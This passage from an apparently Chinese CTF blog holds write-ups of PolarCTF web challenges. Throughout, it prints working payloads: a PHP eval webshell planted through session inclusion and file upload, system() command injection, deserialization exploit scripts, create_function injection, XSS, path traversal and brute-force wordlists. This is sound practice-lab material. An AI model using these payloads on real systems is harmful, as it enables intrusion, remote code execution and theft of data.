title="被黑掉的网站"></a>被黑掉的网站</h3><p>首先访问URL什么也没有，用dirsearch扫一下目录,出现了几个可以访问的文件</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-24 20.05.30.png" alt="截屏2025-02-24 20.05.30" style="zoom:50%;" /></p><p>首先/index.php.bak文件不是知道是什么，查看一下/shell.php</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-24 20.06.15.png" alt="截屏2025-02-24 20.06.15" style="zoom:50%;" /></p><p>发现需要输入，想到上边的index.php.bak文件的内容试一下,首先用py脚本将空格转化为换行，然后使用bp进行爆破当pass=nikel时，出现了flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">replace_spaces_with_newlines</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="comment"># 使用字符串的 replace 方法将空格替换为换行符</span></span><br><span class="line">    result = input_string.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">input_string = <span class="string">&quot;123456 123456789 123123 111111 anhyeuem 1234567 123456789 123456 12345678 000000 asdasd 25251325 1234567890 121212 123321 zxcvbnm qweqwe 456789 112233 aaaaaa 123123123 987654321 11111111 qwerty 147258369 maiyeuem 123qwe 654321 iloveyou 123654 999999 qqqqqq 1111111 147258 hota407 anhtuan 222222 159753 11223344 anhnhoem anh123 159357 qwertyuiop asd123 987654321 emyeuanh mmmmmm 12345 666666 anhanh 123789 phuong 111222 qweasd hanoiyeudau nguyen 789456 1111111111 mylove 789456123 19001560 qwe123 asdfghjkl pppppp anhhung 1234560 abc123 maiyeu 123456a zzzzzz quangninh 987654 555555 tuananh asasas asdfgh zxcvbn 321321 tinhyeu 147852369 456123 matkhau 147852 12345678910 thienthan nikel anhyeu 111111111 toilatoi 10cham0 147258369 456456 khongbiet 789789 a123456 333333 888888 123654789 truong maimaiyeuem hhhhhh&quot;</span></span><br><span class="line">output_string = replace_spaces_with_newlines(input_string)</span><br><span class="line"><span class="built_in">print</span>(output_string)</span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-24 20.07.21.png" alt="截屏2025-02-24 20.07.21" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-24 20.18.19.png" alt="截屏2025-02-24 20.18.19" style="zoom:25%;" /></p><h3 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h3><p>首先通过题目的提示是jwt的题目，那么访问URL发现是个登录和注册，首先自己注册一个看到了cookie有jwt那么，先爆破一下密钥然后重新构造jwt，将username改为admin，使用的工具<a href="https://www.bejson.com/jwt/">https://www.bejson.com/jwt/</a></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-24 20.47.14.png" alt="截屏2025-02-24 20.47.14" style="zoom:50%;" /></p><p>然后将生成的jwt放到自己登录的cookie中，刷新页面，发现用户名变为了admin，点击个人中心发现了flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-24 20.48.25.png" alt="截屏2025-02-24 20.48.25" style="zoom:50%;" /></p><h3 id=""><a href="#" class="headerlink" title="$$"></a>$$</h3><p>看题目是$$感觉应该是和全局相关的，查看代码，发现是通过GET方式给c一个值，然后通过preg_match()函数进行正则匹配，如果匹配到就输出oh，否则就输出变量a，那么考虑给c一全局变量c=GLOBALS</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-25 14.53.21.png" alt="截屏2025-02-25 14.53.21" style="zoom:50%;" /></p><p>发现给出了flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-25 14.56.43.png" alt="截屏2025-02-25 14.56.43" style="zoom:50%;" /></p><h3 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h3><p>首先访问URL发现有一个输入框，随便输入，查看网页代码发现了file=1.txt和2.txt,点击my dairy发现了</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-25 15.23.56.png" alt="截屏2025-02-25 15.23.56" style="zoom:25%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-25 15.31.47.png" alt="截屏2025-02-25 15.31.47" style="zoom:50%;" /></p><p>那么通过伪协议进行读取（base64编码）<code>php://filter/read=convert.base64-encode/resource=action.php</code>因为题目中给的是action.php所以读取这个文件，然后用base64解码</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-25 15.33.27.png" alt="截屏2025-02-25 15.33.27" style="zoom:25%;" /></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//解码的内容</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">error_reporting(0);</span><br><span class="line">$name = $_POST[&#x27;name&#x27;];</span><br><span class="line">if($name)&#123;</span><br><span class="line">    $_SESSION[&quot;username&quot;] = $name;</span><br><span class="line">&#125;</span><br><span class="line">include($_GET[&#x27;file&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;a href=action.php?file=1.txt&gt;my dairy&lt;/a&gt;</span><br><span class="line">&lt;a href=action.php?file=2.txt&gt;my booklist&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>是一个php代码</p><p>session文件名的构造是sess_ + sessionid ， sessionid在cookie中可以查看</p><p>有了参数，开始猜存放session文件的位置，一般默认为tmp，直接执行命令访问session文件</p><p>这里可以采取两种方式得到flag：命令读取或者蚁剑连接shell</p><p>然后通过给name传入shell，用蚁剑读取<code>name=&lt;?php @eval($_POST[a]);?&gt;</code></p><p>命令读取用<code>name=&lt;?=system(&#39;cat+/f*&#39;);?&gt;</code></p><h3 id="PHP反序列化初试"><a href="#PHP反序列化初试" class="headerlink" title="PHP反序列化初试"></a>PHP反序列化初试</h3><p>首先访问url，看到了代码，有两个魔术方法<code>__wakeup()</code>和<code>__toString()</code>，分析代码在Evil类中有个evil变量执行了shell_exec()函数所以<code>evil=&#39;tac f*&#39;</code></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 16.26.28.png" alt="截屏2025-02-26 16.26.28" style="zoom:50%;" /></p><p>然后编写exp，得到flag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evil</span>=<span class="string">&#x27;tac f*&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$env</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Easy</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Evil</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!-- 首先是<span class="keyword">new</span>了两个类，让Easy类的name变量去调用第二个类，然后执行第二个类中的<span class="title function_ invoke__">shell_exec</span>()函数 --&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 16.30.44.png" alt="截屏2025-02-26 16.30.44" style="zoom:25%;" /></p><h3 id="干正则"><a href="#干正则" class="headerlink" title="干正则"></a>干正则</h3><p>访问URL，看到源码</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 16.40.48.png" alt="截屏2025-02-26 16.40.48" style="zoom:33%;" /></p><p>分析一下，首先用get方式传入一个参数id，然后else中有个一个parse_str()函数，他是将参数id中的值进行查找，如果找到就将变量的值改为id中该变量的值</p><p>例如：<code>id=a=123</code>，是将上边变量a的值改为123</p><p>根据这个parse_str()函数就可以给id传入一个a[0]的值，因为下边有if判断a[0]的值和www.polarctf.com是否相等，相等会执行下边参数cmd的值</p><p>构造payload=<code>?id=a[0]=www.polarctf.com&amp;cmd=;tac f*</code>,得到flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 16.47.36.png" alt="截屏2025-02-26 16.47.36" style="zoom:25%;" /></p><h3 id="uploader"><a href="#uploader" class="headerlink" title="uploader"></a>uploader</h3><p>首先访问URL，得到下边代码，分析代码，首先是获取一个ip地址转化为md5，然后没有什么过滤，写个py脚本传文件吧</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 16.57.23.png" alt="截屏2025-02-26 16.57.23" style="zoom:50%;" /></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&#x27;http://35052cba-8e36-490a-ae62-9e23431088ce.www.polarctf.com:8090/&#x27;</span>  <span class="comment"># 替换成你的服务器地址</span></span><br><span class="line"> </span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;/Users/mayuanzheng/Desktop/马子/hack.php&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;  <span class="comment"># 将文件名替换为你想上传的文件</span></span><br><span class="line"> </span><br><span class="line">response = requests.post(url, files=files)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;文件上传成功！&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;服务器返回的消息:&quot;</span>, response.text)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;文件上传失败！&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;错误码:&quot;</span>, response.status_code)</span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 17.01.46.png" alt="截屏2025-02-26 17.01.46" style="zoom:25%;" /></p><p>上传成功后，给出了路径fc4开头的是目录，前边hack.php为文件名，用蚁剑连接找flag</p><h3 id="debudao"><a href="#debudao" class="headerlink" title="debudao"></a>debudao</h3><p>访问url发现一个输入框，测试了注入，发现不是注入，试了一下xss发现是xss</p><p>首先用<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</code>发现弹了1，那么构造payload<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>得到了flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 17.15.08.png" alt="截屏2025-02-26 17.15.08"></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 17.17.32.png" alt="截屏2025-02-26 17.17.32" style="zoom:50%;" /></p><h3 id="rapyiquan"><a href="#rapyiquan" class="headerlink" title="rapyiquan"></a>rapyiquan</h3><p>访问URL，分析一下代码，应该是用get方法传递一个参数c<em>md，但是过滤了’</em>‘考虑用’[‘替换一下</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 17.29.37.png" alt="截屏2025-02-26 17.29.37" style="zoom:25%;" /></p><p>构造一下<code>c[md=l\s /</code>发现了flag.php文件，然后使用payload=<code>c[md=t\ac /f\lag.php</code></p><h3 id="1ncIud3"><a href="#1ncIud3" class="headerlink" title="1ncIud3"></a>1ncIud3</h3><p>访问URL显示了?page=,那么尝试get方式传入值</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 18.37.28.png" alt="截屏2025-02-26 18.37.28" style="zoom:50%;" /></p><p>然后尝试给一个flag值,然后根据提示和题目进行修改，想到了因为是在某个目录下，所以用…/./为一组，不出意外基本题型最多也就四组，四组还不行的话就换命令了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">最常用的替换f1a9  f1ag  f149</span><br></pre></td></tr></table></figure><p>构造payload<code>?page=..././..././f1a9</code>得到flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 18.37.59.png" alt="截屏2025-02-26 18.37.59" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 18.40.05.png" alt="截屏2025-02-26 18.40.05" style="zoom:50%;" /></p><h3 id="投喂"><a href="#投喂" class="headerlink" title="投喂"></a>投喂</h3><p>访问URL得到提示</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 18.44.04.png" alt="截屏2025-02-26 18.44.04"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">欢迎参加CTF挑战赛！</span><br><span class="line">使用以下API进行交互：</span><br><span class="line">POST包含序列化User对象的参数“data”</span><br><span class="line">提示：您可能想了解PHP序列化是如何工作的。尝试使用username和is_admin属性序列化User对象。</span><br><span class="line">额外提示：如果你能让服务器认为你是管理员（is_admin=true），你可能会得到一些特别的东西。</span><br></pre></td></tr></table></figure><p>根据提示构造反序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$is_admin</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;is_admin = <span class="string">&#x27;true&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到payload=<code>data=O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;N;s:8:&quot;is_admin&quot;;s:4:&quot;true&quot;;&#125;</code>用post方式传入参数，得到flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 18.48.43.png" alt="截屏2025-02-26 18.48.43" style="zoom:25%;" /></p><h3 id="狗黑子的RCE"><a href="#狗黑子的RCE" class="headerlink" title="狗黑子的RCE"></a>狗黑子的RCE</h3><p>访问URL得到的代码，分析一下，get传如gouheizi1可以执行命令，post传入gouheizi2如何通过if就可以执行gouheizi1的命令，发现没有过滤\,构造<code>gouheizi2=gougouheiziheizi</code>因为gouheizi2使用了str_replace()函数进行替换空格，然后去绕过</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 18.59.56.png" alt="截屏2025-02-26 18.59.56"></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 19.02.27.png" alt="截屏2025-02-26 19.02.27" style="zoom:50%;" /></p><h3 id="井字棋"><a href="#井字棋" class="headerlink" title="井字棋"></a>井字棋</h3><p>首先通过URL发现是一个游戏，一看就是看js源码，发现下边的代码在declareWinner()函数断点，断住了</p><p>根据<code>declareWinner(gameWon.player === huPlayer ? &quot;您赢了！&quot; : &quot;您输了.&quot;);</code>这个代码，只有在您赢了！  的时候才能进行下边通过game.php传到后端取出flag</p><p>那么直接在控制台console中输入<code>declareWinner(&quot;您赢了！&quot;);</code>,在断点的时候发现传到后端的是赢了，那么就能弹出flag了</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 20.31.10.png" alt="截屏2025-02-26 20.31.10" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 20.35.10.png" alt="截屏2025-02-26 20.35.10" style="zoom:25%;" /></p><h3 id="简单的导航站"><a href="#简单的导航站" class="headerlink" title="简单的导航站"></a>简单的导航站</h3><p>首先访问URL获得的信息</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 20.46.31.png" alt="截屏2025-02-26 20.46.31" style="zoom:50%;" /></p><p>首先通过注册一个新用户查看用户列表出现了PHP代码，发现是md5绕过漏洞,发现是md5($user1) === md5($user2)强比较，试一下数组</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 20.43.06.png" alt="截屏2025-02-26 20.43.06" style="zoom:50%;" /></p><ul><li>有一些<a href="https://so.csdn.net/so/search?q=字符串&amp;spm=1001.2101.3001.7020">字符串</a>的MD5值为0e开头，这里记录一下<ul><li>QNKCDZO</li><li>240610708</li><li>s878926199a</li><li>s155964671a</li><li>s214587387a</li></ul></li><li>还有MD5和双MD5以后的值都是0e开头的<ul><li>CbDLytmyGm2xQyaLNhWn</li><li>770hQgrBOjrcqftrlaZk</li><li>7r4lGXCH2Ksu2JNT3BYM</li></ul></li></ul><p>通过数组绕过了获得了用户名，发现</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 20.45.36.png" alt="截屏2025-02-26 20.45.36" style="zoom:50%;" /></p><p>在最开始的首页源码中发现了Admin1234!感觉应该是密码吧，直接bp爆破，发现了用户名为P0la2adm1n，然后登录管理员后，上传文件，这里没有什么过滤直接上传，然后路径为/uploads/hack.php</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 21.08.51.png" alt="截屏2025-02-26 21.08.51" style="zoom:50%;" /></p><p>然后用蚁剑连接后发现了flag目录里边还有flag.txt,点进去发现有好多flag，又想到Flag认证，应该是需要爆破，直接上bp</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 21.10.48.png" alt="截屏2025-02-26 21.10.48" style="zoom:50%;" /></p><p>爆破成功得到flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 21.12.28.png" alt="截屏2025-02-26 21.12.28"></p><h3 id="到底给不给flag呢"><a href="#到底给不给flag呢" class="headerlink" title="到底给不给flag呢"></a>到底给不给flag呢</h3><p>访问URL，分析代码发现了foreach()函数搭配 $$ 是个典型的变量覆盖漏洞，使用 foreach() 遍历数组中的值，将获取到的数组键名作为变量，数组中的键值作为变量的值。GET，POST需要有一个满足key为flag的传参，并且value不能等于flag，若想输出执行到最后输出flag，那么变量覆盖时候不能将 $flag 的值等于除 $flag 外的任意值，即在foreach内的变量覆盖过程中，需要实现</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 21.26.10.png" alt="截屏2025-02-26 21.26.10"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$$key</span> = <span class="variable">$flag</span></span><br><span class="line"> <span class="variable">$$value</span> = <span class="variable">$flag</span></span><br><span class="line"> <span class="variable">$$key</span> = <span class="variable">$flag</span></span><br><span class="line"> <span class="comment">// 代码执行过程如下：</span></span><br><span class="line"> <span class="comment">// 第一个foreach 循环处理$_POST数组，传值为_GET[flag]=flag，变量覆盖过程为</span></span><br><span class="line"> <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line"> <span class="comment">// 此时注意GET数组的值</span></span><br><span class="line"> $ _GET[<span class="string">&quot;flag&quot;</span>]=<span class="number">123</span></span><br><span class="line"> <span class="comment">// 而经过$_POST的变量覆盖</span></span><br><span class="line"> $ _GET =<span class="keyword">array</span>(<span class="number">1</span>) &#123; [<span class="string">&quot;flag&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;flag&quot;</span> &#125; </span><br><span class="line"> <span class="comment">// 故而最开始传GET参数时?flag=xxx，可等于任意值。因为会被POST变量覆盖完成后的值覆盖。</span></span><br><span class="line"> <span class="comment">// 第二个foreach 循环处理$_GET数组，变量覆盖过程为</span></span><br><span class="line"> <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line"> <span class="variable">$key</span>=flag;</span><br><span class="line"> <span class="variable">$value</span>=flag;</span><br><span class="line"> <span class="variable">$$key</span>=<span class="variable">$Svalue</span>;</span><br><span class="line"> <span class="variable">$$key</span>=<span class="variable">$flag</span>;</span><br><span class="line"> <span class="variable">$flag</span>=<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p>构造payload：get参数<code>?flag</code>,post参数<code>_GET[flag]=flag</code>得到flag</p><h3 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h3><p>首先看代码，发现是是get传入文件名post传入内容进行写，肯定通过通过php://filter/convert.base64-decode/resource=1.php来写文件，看到了源码中有<code>&lt;?php exit();</code>看起来应该用<code>?&gt;</code>来闭合一下，那么post传入参数为<code>content=?&gt;a&lt;?php system(&#39;cat /flag&#39;); ?&gt;</code>a为占位的，将<code>&lt;?php system(&#39;cat /flag&#39;); ?&gt;</code>转化为base64为<code>PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTsgPz4=</code>拼接后为<code>content=?&gt;aPD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTsgPz4=</code>写shell，访问1.php得到flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 21.40.06.png" alt="截屏2025-02-26 21.40.06" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 21.44.08.png" alt="截屏2025-02-26 21.44.08" style="zoom:50%;" /></p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__construct 当一个对象创建时被调用</span><br><span class="line">__destruct 当一个对象销毁时被调用</span><br><span class="line">__toString 当一个对象被当作一个字符串被调用。</span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>() 使用unserialize时触发</span><br><span class="line"><span class="title function_ invoke__">__sleep</span>() 使用serialize时触发</span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() 对象被销毁时触发</span><br><span class="line"><span class="title function_ invoke__">__call</span>() 在对象上下文中调用不可访问的方法时触发</span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() 在静态上下文中调用不可访问的方法时触发</span><br><span class="line"><span class="title function_ invoke__">__get</span>() 用于从不可访问的属性读取数据</span><br><span class="line"><span class="title function_ invoke__">__set</span>() 用于将数据写入不可访问的属性</span><br><span class="line"><span class="title function_ invoke__">__isset</span>() 在不可访问的属性上调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()触发</span><br><span class="line"><span class="title function_ invoke__">__unset</span>() 在不可访问的属性上使用<span class="keyword">unset</span>()时触发</span><br><span class="line"><span class="title function_ invoke__">__toString</span>() 把类当作字符串使用时触发,返回值需要为字符串</span><br><span class="line"><span class="title function_ invoke__">__invoke</span>() 当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure><p>首先分析一下源码，因该是给pid传入一个执行命令的函数去执行得到flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 22.15.20.png" alt="截屏2025-02-26 22.15.20" style="zoom:50%;" /></p><p>构造payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">example</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">process</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$pid</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> example;</span><br><span class="line">    <span class="variable">$b</span> = <span class="keyword">new</span> process;</span><br><span class="line">    <span class="variable">$a</span>-&gt;handle=<span class="variable">$b</span>;</span><br><span class="line">    <span class="variable">$b</span>-&gt;pid=<span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">得到payload O:<span class="number">7</span>:<span class="string">&quot;example&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;handle&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;process&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;pid&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;system(&quot;</span>ls<span class="string">&quot;);&quot;</span>;&#125;&#125;</span><br><span class="line">发现没有flag那么一步一步找flag发现了cat /<span class="keyword">var</span>/www/html/flag.php</span><br><span class="line">  <span class="variable">$b</span>-&gt;pid=<span class="string">&#x27;system(&quot;cat /var/www/html/flag.php&quot;);&#x27;</span>;</span><br><span class="line">得到flag</span><br></pre></td></tr></table></figure><h3 id="某函数的复仇"><a href="#某函数的复仇" class="headerlink" title="某函数的复仇"></a>某函数的复仇</h3><p>分析源码，根据题目感觉post参数应该是<code>shaw=create_function</code>，get参数应该先闭合create_function后边也需要闭合<code>/*</code>然后执行<code>system(&#39;t\ac /flag&#39;)</code></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 22.27.51.png" alt="截屏2025-02-26 22.27.51" style="zoom:50%;" /></p><p>分析完代码，构造payload<code>?root=;&#125;system(&#39;t\ac /flag&#39;);/*</code>post参数<code>shaw=create_function</code></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 22.31.40.png" alt="截屏2025-02-26 22.31.40" style="zoom:50%;" /></p><h3 id="BlackMagic"><a href="#BlackMagic" class="headerlink" title="BlackMagic"></a>BlackMagic</h3><p>首先找到源码，分析源码，通过<code>extract()</code> 函数会将 <code>$_REQUEST</code> 中的键值对提取为变量。</p><p>通过trim()函数把strFlag中的strCharList去掉，最后让strTmp==strContent</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 22.43.13.png" alt="截屏2025-02-26 22.43.13" style="zoom:50%;" /></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP中的trim函数的用法：【trim()】函数是php中的内置函数，用于删除字符串左右两边的空格或预定义字符，并返回修改后的字符串，函数语法为：【trim($string, $charlist)】。</span><br><span class="line"> </span><br><span class="line">$string：用于指定要从中删除空白和左右预定义字符的字符串；必需参数，不可省略。</span><br><span class="line"> </span><br><span class="line">$charlist：用于指定要从字符串中删除的字符。可选参数，可省略；如果省略了，则将删除以下所有字符：</span><br><span class="line"> </span><br><span class="line">-  ” ” (ASCII 32 (0x20))，普通空格符</span><br><span class="line">- “\t” (ASCII 9 (0x09))，制表符</span><br><span class="line">- “\n” (ASCII 10 (0x0A))，换行符</span><br><span class="line">- “\r” (ASCII 13 (0x0D))，回车符</span><br><span class="line">- “\0” (ASCII 0 (0x00))，空字节符</span><br><span class="line">- “\x0B” (ASCII 11 (0x0B))，垂直制表符</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>分析后发现没有过滤制表符就是<code>\t %09</code></p><p>然后构造payload<code>?strTmp=%09xxxxx...xxxxx%09</code>得到flag</p><h3 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h3><p>首先访问URL有一个phpinfo，根据题目提示应该是一个外部注入的漏洞，告诉了flag的位置</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-27 14.08.27.png" alt="截屏2025-02-27 14.08.27" style="zoom:50%;" /></p><p><strong>XXE全称为XML External Entity Injection即XMl外部实体注入漏洞</strong></p><p>XXE漏洞是基于可扩展标记语言 ( XML) 而产生的漏洞，XML是用于存储和传输数据，而对应的HTML语言是用来显示数据的。XXE漏洞的主要功能可以用来信息探针、任意文件读取等</p><p>XXE语法：xml 必须包含根元素，它是所有其他元素的父元素，比如以下实例中 root 就是根元素：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> //文档开头必须</span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">child</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">subchild</span>&gt;</span>.....<span class="tag">&lt;/<span class="name">subchild</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">child</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>DTD分为内部和外部</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">内部</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> //声明xml版本</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [   //声明此文档是note类型的文档</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span 